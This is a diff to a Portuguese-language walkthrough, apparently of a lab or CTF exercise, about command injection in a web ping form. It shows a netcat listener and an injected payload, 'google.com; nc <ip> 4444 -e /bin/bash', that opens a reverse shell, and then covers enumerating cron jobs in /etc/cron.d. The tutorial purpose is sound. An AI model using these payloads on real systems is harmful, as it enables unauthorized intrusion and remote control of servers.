@@ -32,7 +32,7 @@ nc -lvnp 4444
 ```
 neste listener será conectada a shell reversa. De volta para a página web, podemos modificar o input do usuário de forma que o servidor execute o ping e depois execute um comando adicional. Para isso, podemos formular o payload (para saber o endereço da interface pode-se utilizar o comando `ifconfig`):
 ```
-google.com; nc <endereço inet da interface wlp3s0> 4444 -e /bin/bash`
+google.com; nc <endereço inet da interface wlp3s0> 4444 -e /bin/bash
 ```
 A primeira parte garante que o comando será válido, pois `ping` espera um endereço. Ao utilizar o caractere `;`, estamos instruindo a shell a executar o comando seguinte depois do ping. O próximo comando é utilizado para criar a conexão em shell reversa, ao utilizar o netcat para estabelecer uma conexão com o atacante na porta `4444` e executar uma shell `/bin/bash`. Assim, ao incluir o ip corretamente e submeter o formulário no serviço web, pode-se notar que no terminal do listener temos uma shell reversa:
 ```bash
@@ -58,7 +58,6 @@ ls /etc/ | grep cron
 ```
 E depois ver quais são executadas no `crontab`. Entretanto, como o atacante ainda é um usuário normal os serviços executados como root não estarão visíveis. Neste caso, pode-se analidar quais estão configurados apra executar no diretório `cron.d`:
 ```bash
-cat /etc/cron.d
 ls /etc/cron.d
 cronjob
 cat /etc/cron.d/cronjob
